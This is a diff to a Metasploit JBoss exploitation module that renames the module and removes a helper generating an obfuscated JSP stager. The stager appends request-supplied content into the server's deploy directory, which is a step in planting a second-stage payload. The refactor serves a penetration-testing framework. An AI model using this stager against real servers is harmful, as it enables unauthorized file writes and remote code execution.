@@ -1,6 +1,6 @@
 # -*- coding: binary -*-
 
-module Msf::HTTP::JBoss::Scripts
+module Msf::HTTP::JBoss::BeanShellScripts
   
   # Generates a Bean Shell Script.
   #
@@ -17,43 +17,6 @@ module Msf::HTTP::JBoss::Scripts
     end
 
     bean_shell
-  end
-
-  # Generate a stager JSP to write the second stager to the
-  # deploy/management direcotry. It is only used with HEAD/GET requests
-  # to overcome the size limit in those requests
-  #
-  # @param stager_base [String] The name of the base of the stager.
-  # @param stager_jsp [String] The name name of the jsp stager.
-  # @return [String] The JSP head stager.
-  def head_stager_jsp(stager_base, stager_jsp)
-    content_var = rand_text_alpha(8+rand(8))
-    file_path_var = rand_text_alpha(8+rand(8))
-    jboss_home_var = rand_text_alpha(8+rand(8))
-    fos_var = rand_text_alpha(8+rand(8))
-    bw_var = rand_text_alpha(8+rand(8))
-    head_stager_jsp_code = <<-EOT
-<%@page import="java.io.*,
-  java.util.*"
-%>
-<%
-  String #{jboss_home_var} = System.getProperty("jboss.server.home.dir");
-  String #{file_path_var} = #{jboss_home_var} + "/deploy/management/" + "#{stager_base}.war/" + "#{stager_jsp}" + ".jsp";
-  if (request.getParameter("#{content_var}") != null) {
-      try {
-        String parameterName = (String)(request.getParameterNames().nextElement());
-        #{content_var} = request.getParameter(parameterName);
-        FileWriter #{fos_var} = new FileWriter(#{file_path_var}, true);
-        BufferedWriter #{bw_var} = new BufferedWriter(#{fos_var});
-        #{bw_var}.write(#{content_var});
-        #{bw_var}.close();
-      }
-      catch(Exception e) { }
-  }
-%>
-    EOT
-
-    head_stager_jsp 
   end
 
   # Generate a stager JSP to write a WAR file to the deploy/ directory.
